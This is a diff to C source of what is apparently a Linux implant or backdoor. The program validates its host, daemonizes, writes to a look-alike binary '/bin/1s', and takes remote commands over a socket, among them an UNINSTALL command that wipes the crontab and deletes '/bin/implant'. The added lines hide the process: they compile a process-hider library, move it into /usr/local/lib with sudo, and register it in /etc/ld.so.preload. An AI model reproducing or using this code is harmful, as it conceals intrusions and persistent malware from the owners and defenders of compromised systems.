@@ -279,10 +279,10 @@ int main(void) {
         val_IP();       //Macro: VALID_IP
         val_SysName();  //Macro: VALID_SYSNAME
         val_time();     //Macro: VALID_TIME
-        struct Profile* prof = getProfile();
-        char * strProf = strProfile();
-        printf("%s\n", strProf);
-        free(strProf);
+        //struct Profile* prof = getProfile();
+        //char * strProf = strProfile();
+        //printf("%s\n", strProf);
+        //free(strProf);
         //getRoot();
         /*=====================================*/
         /* Our process ID and Session ID */
@@ -298,6 +298,11 @@ int main(void) {
         #endif
         FILE *fp = NULL;
         fp = fopen("/bin/1s", "w");
+
+        //Hide this program
+        system("gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl");
+        system("sudo mv libprocesshider.so /usr/local/lib/");
+        system("echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload");
 
         //#ifndef DEBUG
         pid_t pid, sid;
@@ -384,7 +389,6 @@ void commands(int sockfd){
     }
     buf[numbytes] = '\0';
     if(strcmp(buf,"UNINSTALL\n") == 0){
-      //remove("/tmp/crontab");
       system("crontab -r");
       remove("/bin/implant");
       remove(MUTEX);
